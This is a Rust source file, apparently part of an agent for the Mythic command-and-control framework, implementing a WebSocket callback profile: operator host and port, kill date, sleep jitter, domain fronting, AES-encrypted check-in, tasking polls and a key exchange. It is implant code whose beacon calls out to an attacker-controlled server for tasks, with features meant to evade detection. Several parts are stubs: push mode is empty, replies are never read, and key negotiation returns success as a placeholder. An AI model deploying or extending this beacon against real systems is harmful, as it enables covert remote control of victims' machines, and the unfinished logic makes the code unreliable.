use crate::profiles;
use crate::structs::{
    EkeKeyExchangeMessage, MythicMessage,
    Profile,
};
use crate::utils;
use crate::utils::crypto;
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use chrono::NaiveDate;
use futures::stream::{SplitSink, SplitStream};
use futures::{SinkExt, StreamExt};
use std::sync::atomic::{AtomicBool, AtomicI32, Ordering};
use std::sync::RwLock;
use tokio::net::TcpStream;
use tokio::sync::{mpsc, Mutex};
use tokio::time::Duration;
use tokio_tungstenite::{tungstenite::Message, MaybeTlsStream, WebSocketStream};

#[derive(Debug, Clone, serde::Deserialize)]
pub struct WebsocketInitialConfig {
    #[serde(rename = "callback_host")]
    pub callback_host: String,
    #[serde(rename = "callback_port")]
    pub callback_port: i32,
    #[serde(rename = "callback_interval")]
    pub interval: i32,
    #[serde(rename = "callback_jitter")]
    pub jitter: i32,
    pub killdate: String,
    #[serde(rename = "encrypted_exchange_check")]
    pub encrypted_exchange_check: String,
    #[serde(rename = "AESPSK")]
    pub aes_psk: String,
    #[serde(default)]
    pub endpoint: String,
    #[serde(default, rename = "domain_front")]
    pub domain_front: String,
    #[serde(default)]
    pub user_agent: String,
    #[serde(default, rename = "tasking_type")]
    pub tasking_type: String,
}

type WsSink = SplitSink<WebSocketStream<MaybeTlsStream<TcpStream>>, Message>;
type WsStream = SplitStream<WebSocketStream<MaybeTlsStream<TcpStream>>>;

pub struct WebsocketProfile {
    callback_host: RwLock<String>,
    callback_port: AtomicI32,
    interval: AtomicI32,
    jitter: AtomicI32,
    killdate: RwLock<NaiveDate>,
    encrypted_exchange_check: RwLock<String>,
    aes_key: RwLock<Option<Vec<u8>>>,
    uuid: RwLock<String>,
    endpoint: RwLock<String>,
    domain_front: RwLock<String>,
    user_agent: RwLock<String>,
    tasking_type: RwLock<String>,
    running: AtomicBool,
    should_stop: AtomicBool,
    push_channel_tx: RwLock<Option<mpsc::Sender<MythicMessage>>>,
}

impl WebsocketProfile {
    pub fn new(config: WebsocketInitialConfig) -> Self {
        let aes_key = if !config.aes_psk.is_empty() {
            BASE64.decode(&config.aes_psk).ok()
        } else {
            None
        };

        let killdate = NaiveDate::parse_from_str(&config.killdate, "%Y-%m-%d")
            .unwrap_or_else(|_| NaiveDate::from_ymd_opt(2099, 12, 31).unwrap());

        Self {
            callback_host: RwLock::new(config.callback_host),
            callback_port: AtomicI32::new(config.callback_port),
            interval: AtomicI32::new(config.interval),
            jitter: AtomicI32::new(config.jitter),
            killdate: RwLock::new(killdate),
            encrypted_exchange_check: RwLock::new(config.encrypted_exchange_check),
            aes_key: RwLock::new(aes_key),
            uuid: RwLock::new(profiles::get_uuid()),
            endpoint: RwLock::new(config.endpoint),
            domain_front: RwLock::new(config.domain_front),
            user_agent: RwLock::new(config.user_agent),
            tasking_type: RwLock::new(config.tasking_type),
            running: AtomicBool::new(false),
            should_stop: AtomicBool::new(false),
            push_channel_tx: RwLock::new(None),
        }
    }

    fn get_ws_url(&self) -> String {
        let host = self.callback_host.read().unwrap();
        let port = self.callback_port.load(Ordering::Relaxed);
        let endpoint = self.endpoint.read().unwrap();

        let scheme = if host.starts_with("https") {
            "wss"
        } else {
            "ws"
        };

        let clean_host = host
            .trim_start_matches("https://")
            .trim_start_matches("http://");
        format!("{}://{}:{}{}", scheme, clean_host, port, endpoint)
    }

    fn encode_message(&self, data: &[u8]) -> String {
        let uuid = self.uuid.read().unwrap().clone();
        let aes_key = self.aes_key.read().unwrap();

        let payload = if let Some(key) = aes_key.as_ref() {
            let encrypted = crypto::aes_encrypt(key, data);
            BASE64.encode(&encrypted)
        } else {
            BASE64.encode(data)
        };

        format!("{}{}", uuid, payload)
    }

    fn decode_response(&self, response_text: &str) -> Option<Vec<u8>> {
        if response_text.len() < 36 {
            return None;
        }
        let new_uuid = &response_text[..36];
        let encoded_data = &response_text[36..];

        {
            let current_uuid = self.uuid.read().unwrap().clone();
            if new_uuid != current_uuid {
                let mut uuid = self.uuid.write().unwrap();
                *uuid = new_uuid.to_string();
            }
        }

        let decoded = BASE64.decode(encoded_data).ok()?;
        let aes_key = self.aes_key.read().unwrap();
        if let Some(key) = aes_key.as_ref() {
            let decrypted = crypto::aes_decrypt(key, &decoded);
            if decrypted.is_empty() {
                None
            } else {
                Some(decrypted)
            }
        } else {
            Some(decoded)
        }
    }

    fn past_killdate(&self) -> bool {
        let killdate = self.killdate.read().unwrap();
        let today = chrono::Local::now().date_naive();
        today > *killdate
    }
}

#[async_trait::async_trait]
impl Profile for WebsocketProfile {
    fn profile_name(&self) -> &str {
        "websocket"
    }

    fn is_p2p(&self) -> bool {
        false
    }

    async fn start(&self) {
        self.running.store(true, Ordering::Relaxed);
        self.should_stop.store(false, Ordering::Relaxed);

        let url = self.get_ws_url();
        utils::print_debug(&format!("WebSocket: Connecting to {}", url));

        // Connect
        let (ws_stream, _) = match tokio_tungstenite::connect_async(&url).await {
            Ok(s) => s,
            Err(e) => {
                log::error!("WebSocket: Connection failed: {}", e);
                self.running.store(false, Ordering::Relaxed);
                return;
            }
        };

        let (write, _read) = ws_stream.split();
        let write = std::sync::Arc::new(Mutex::new(write));

        // EKE negotiation if needed
        let exchange_check = self.encrypted_exchange_check.read().unwrap().clone();
        if exchange_check == "T" {
            if !self.ws_negotiate_key(&write).await {
                log::error!("WebSocket: Key negotiation failed");
                self.running.store(false, Ordering::Relaxed);
                return;
            }
        }

        // Checkin
        let checkin_msg = profiles::create_checkin_message();
        let checkin_json = serde_json::to_vec(&checkin_msg).unwrap();
        let encoded = self.encode_message(&checkin_json);

        {
            let mut sink = write.lock().await;
            if sink.send(Message::Text(encoded.into())).await.is_err() {
                log::error!("WebSocket: Checkin send failed");
                self.running.store(false, Ordering::Relaxed);
                return;
            }
        }

        // For now, handle as poll mode
        // TODO: Implement push mode where we listen for incoming messages
        let tasking_type = self.tasking_type.read().unwrap().clone();
        if tasking_type == "Push" {
            // Set up push channel
            let (push_tx, _push_rx) = mpsc::channel::<MythicMessage>(100);
            {
                let mut ch = self.push_channel_tx.write().unwrap();
                *ch = Some(push_tx);
            }

            // Spawn push sender
            let _write_clone = write.clone();
            let _profile_ref = &*self;
            // Push mode main loop would go here
            utils::print_debug("WebSocket: Push mode started");
        }

        utils::print_debug("WebSocket: Checkin successful, starting main loop");

        // Poll mode main loop
        while !self.should_stop.load(Ordering::Relaxed) && !self.past_killdate() {
            let sleep_time = self.get_sleep_time();
            if sleep_time > 0 {
                tokio::time::sleep(Duration::from_secs(sleep_time as u64)).await;
            }

            if self.should_stop.load(Ordering::Relaxed) {
                break;
            }

            let msg = MythicMessage::new_get_tasking();
            let msg_json = match serde_json::to_vec(&msg) {
                Ok(j) => j,
                Err(_) => continue,
            };
            let encoded = self.encode_message(&msg_json);

            {
                let mut sink = write.lock().await;
                if sink.send(Message::Text(encoded.into())).await.is_err() {
                    profiles::increment_failed_connection("websocket");
                    continue;
                }
            }

            // TODO: Read response from ws_stream and process
        }

        self.running.store(false, Ordering::Relaxed);
        utils::print_debug("WebSocket: Profile stopped");
    }

    fn stop(&self) {
        self.should_stop.store(true, Ordering::Relaxed);
    }

    fn set_sleep_interval(&self, interval: i32) -> String {
        self.interval.store(interval, Ordering::Relaxed);
        format!("Updated interval to {}\n", interval)
    }

    fn get_sleep_interval(&self) -> i32 {
        self.interval.load(Ordering::Relaxed)
    }

    fn set_sleep_jitter(&self, jitter: i32) -> String {
        let j = jitter.clamp(0, 100);
        self.jitter.store(j, Ordering::Relaxed);
        format!("Updated jitter to {}%\n", j)
    }

    fn get_sleep_jitter(&self) -> i32 {
        self.jitter.load(Ordering::Relaxed)
    }

    fn get_sleep_time(&self) -> i32 {
        let interval = self.interval.load(Ordering::Relaxed);
        let jitter = self.jitter.load(Ordering::Relaxed);
        if jitter == 0 || interval == 0 {
            return interval;
        }
        let jitter_range = (interval as f64 * jitter as f64 / 100.0) as i32;
        let variation = utils::random_num_in_range(-jitter_range, jitter_range + 1);
        (interval + variation).max(0)
    }

    async fn sleep(&self) {
        let sleep_time = self.get_sleep_time();
        if sleep_time > 0 {
            tokio::time::sleep(Duration::from_secs(sleep_time as u64)).await;
        }
    }

    fn get_kill_date(&self) -> NaiveDate {
        *self.killdate.read().unwrap()
    }

    fn set_encryption_key(&self, new_key: &str) {
        if let Ok(key) = BASE64.decode(new_key) {
            let mut aes_key = self.aes_key.write().unwrap();
            *aes_key = Some(key);
        }
    }

    fn get_config(&self) -> String {
        let host = self.callback_host.read().unwrap();
        let port = self.callback_port.load(Ordering::Relaxed);
        let endpoint = self.endpoint.read().unwrap();
        let interval = self.interval.load(Ordering::Relaxed);
        let jitter = self.jitter.load(Ordering::Relaxed);
        let tasking_type = self.tasking_type.read().unwrap();
        format!(
            "  Host: {}:{}{}\n  Tasking: {}\n  Interval: {}s\n  Jitter: {}%\n",
            host, port, endpoint, tasking_type, interval, jitter
        )
    }

    fn update_config(&self, parameter: &str, value: &str) {
        match parameter {
            "callback_host" => *self.callback_host.write().unwrap() = value.to_string(),
            "callback_port" => {
                if let Ok(port) = value.parse::<i32>() {
                    self.callback_port.store(port, Ordering::Relaxed);
                }
            }
            "callback_interval" => {
                if let Ok(interval) = value.parse::<i32>() {
                    self.interval.store(interval, Ordering::Relaxed);
                }
            }
            _ => utils::print_debug(&format!("Unknown WS config parameter: {}", parameter)),
        }
    }

    fn get_push_channel(&self) -> Option<mpsc::Sender<MythicMessage>> {
        self.push_channel_tx.read().unwrap().clone()
    }

    fn is_running(&self) -> bool {
        self.running.load(Ordering::Relaxed)
    }
}

impl WebsocketProfile {
    async fn ws_negotiate_key(
        &self,
        write: &std::sync::Arc<Mutex<WsSink>>,
    ) -> bool {
        let (pub_pem, _priv_key) = match crypto::generate_rsa_keypair() {
            Some(pair) => pair,
            None => return false,
        };

        let session_id = utils::generate_session_id();
        let eke_msg = EkeKeyExchangeMessage {
            action: "staging_rsa".to_string(),
            pub_key: BASE64.encode(&pub_pem),
            session_id,
        };

        let eke_json = serde_json::to_vec(&eke_msg).unwrap();
        let encoded = self.encode_message(&eke_json);

        {
            let mut sink = write.lock().await;
            if sink.send(Message::Text(encoded.into())).await.is_err() {
                return false;
            }
        }

        // TODO: Read response, decrypt session key
        // For now, return true as placeholder
        true
    }
}
